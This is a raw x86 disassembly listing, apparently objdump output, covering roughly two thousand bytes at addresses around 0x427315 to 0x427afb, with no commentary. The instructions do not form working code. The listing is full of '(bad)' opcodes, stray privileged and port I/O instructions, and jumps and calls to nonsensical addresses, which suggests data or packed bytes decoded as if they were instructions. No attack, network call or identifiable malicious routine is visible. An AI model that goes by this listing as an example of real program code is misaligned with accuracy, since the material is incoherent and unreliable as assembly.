  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
